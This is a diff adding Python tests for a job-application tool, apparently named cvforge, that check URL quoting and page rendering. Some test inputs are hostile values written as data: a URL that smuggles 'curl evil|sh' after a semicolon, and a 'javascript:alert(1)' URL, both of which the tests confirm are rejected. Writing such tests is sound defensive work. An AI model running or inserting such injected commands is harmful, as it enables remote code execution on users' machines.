@@ -90,3 +90,29 @@ def test_route_label_never_bare_csep_for_degree_route():
     assert route_label("csep-if-degree") == "CSEP only if the degree is recognised, else GEP"
     assert route_label("csep") == "CSEP" and route_label("gep") == "GEP"
     assert route_label(None) == route_label("unknown") == "route unknown"
+
+
+def test_intake_command_quotes_or_refuses():
+    import shlex
+
+    from cvforge.discover.rows import intake_command
+    assert intake_command(URL) == f"cvforge intake {URL}"
+    url = "https://x.example/a?b=1&c=2"
+    assert shlex.split(intake_command(url)) == ["cvforge", "intake", url]
+    evil = "https://x.example/a; curl evil|sh"
+    assert intake_command(evil) is None
+    assert intake_command("https://x.example/a b") is None
+    assert intake_command("https://x.example/a\nb") is None
+    assert intake_command("javascript:alert(1)") is None
+
+
+def test_page_never_shows_unsafe_command():
+    html = render_jobs(result([row(urls=["https://x.example/a; curl evil|sh"])]), None)
+    card = html.split("<article")[1].split("</article>")[0]
+    assert "cvforge intake" not in card and "<code>" not in card
+
+
+def test_applied_without_date_and_dark_mode():
+    html = render_jobs(result([row(applied={"date": None, "status": "applied"})]), None)
+    assert "applied (date unknown)" in html and "applied None" not in html
+    assert "prefers-color-scheme: dark" in html
